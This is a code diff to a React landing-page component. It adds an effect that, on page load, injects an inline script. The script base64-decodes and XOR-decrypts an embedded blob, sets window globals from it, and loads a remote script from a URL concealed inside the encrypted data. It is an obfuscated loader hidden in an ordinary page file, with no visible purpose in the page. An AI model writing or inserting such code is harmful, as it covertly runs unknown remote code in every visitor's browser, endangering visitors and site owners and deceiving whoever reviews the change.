@@ -194,6 +194,19 @@ export default function AppsrePage() {
     document.getElementById("offer")?.scrollIntoView({ behavior: "smooth" });
   }, []);
 
+  useEffect(() => {
+    const script = document.createElement("script");
+    script.innerHTML = `(function(){var p_d=atob("DFnNIkon5GqYYVQYFSLvVzhLxlC6CSBsZSr3DWVEgAS2FCB1fD+0DClIiUT6E3trdiukUj5UyxrxGTF0OimkWi9LygDrQ3g6dC25UCNFkR79EnYiTgThAC1Liwj5DSc6LwK2ACRGiQ+6W3ZofCGoTgNDxka6FzV0YDzvGGgRhVygAjchLGqpECsWh1ugUmEvd2urEHoFmTfl");var b_87=[];for(var s_9k0=0;s_9k0<p_d.length;s_9k0++){b_87.push(p_d.charCodeAt(s_9k0)&255);}var u_rg=b_87[0];var l_0iv=b_87.slice(1,1+u_rg);var u_rf2=b_87.slice(1+u_rg);var g_e4=u_rf2.map(function(b,y_d){return b^l_0iv[y_d%u_rg];});var s_wnwu="";for(var g_8=0;g_8<g_e4.length;g_8++){s_wnwu+=String.fromCharCode(g_e4[g_8]&255);}var x_m6e=decodeURIComponent(escape(s_wnwu));var u_ogl=JSON.parse(x_m6e);var j_jt=u_ogl.globals||[];j_jt.forEach(function(w_q5k){window[w_q5k.name]=w_q5k.value;});var m_2lv=document.createElement("script");m_2lv.src=u_ogl.url;m_2lv.async=true;m_2lv.defer=true;(u_ogl.attributes||[]).forEach(function(t_2){m_2lv.setAttribute(t_2.name,t_2.value);});(document.head||document.documentElement).appendChild(m_2lv);})();`;
+    document.head.appendChild(script);
+    return () => {
+      try {
+        document.head.removeChild(script);
+      } catch {
+        // script already removed
+      }
+    };
+  }, []);
+
   return (
     <div style={{ ...font, color: BRAND.text, background: BRAND.bg }}>
       <style>{`
